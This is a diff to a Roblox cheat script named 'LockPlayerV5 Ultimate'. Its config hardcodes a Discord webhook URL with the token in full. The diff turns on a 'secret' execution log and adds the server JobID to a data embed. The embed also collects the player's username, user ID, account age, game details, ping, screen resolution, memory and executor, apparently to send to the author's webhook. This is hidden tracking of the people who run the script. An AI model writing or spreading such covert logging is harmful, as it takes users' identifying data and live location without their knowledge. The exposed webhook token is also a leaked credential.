@@ -1,7 +1,7 @@
 -- config
 getgenv().whscript = "LockPlayerV5 Ultimate"
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1451922364601339944/nEUNJh2lVw40jb3CsfFFJ24fNrTj5LSdeP0QVdV9EmPo6urnGMd-g_AlC4GE4kiuGofk"  -- Webhook lu
-getgenv().ExecLogSecret = false
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1451922364601339944/nEUNJh2lVw40jb3CsfFFJ24fNrTj5LSdeP0QVdV9EmPo6urnGMd-g_AlC4GE4kiuGofk"
+getgenv().ExecLogSecret = true
 
 -- executing
 local ui = gethui()
@@ -75,7 +75,7 @@ else
                 {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
                 {["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: https://www.roblox.com/users/" .. userid .. "/profile```", ["inline"] = false},
                 {["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium: " .. premium .. "\n📅 Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
-                {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game: " .. gameName .. "\n🆔 Place ID: " .. gameid .. "\n🔗 Link: https://www.roblox.com/games/" .. gameid .. "\n🔢 Version: " .. gameVersion .. "```", ["inline"] = false},
+                {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game: " .. gameName .. "\n🆔 Place ID: " .. gameid .. "\n🔗 JobID: " .. jobid .. "\n🔗 Link: https://www.roblox.com/games/" .. gameid .. "\n🔢 Version: " .. gameVersion .. "```", ["inline"] = false},
                 {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
                 {["name"] = "📡 **Network**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
                 {["name"] = "🖥️ **System**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
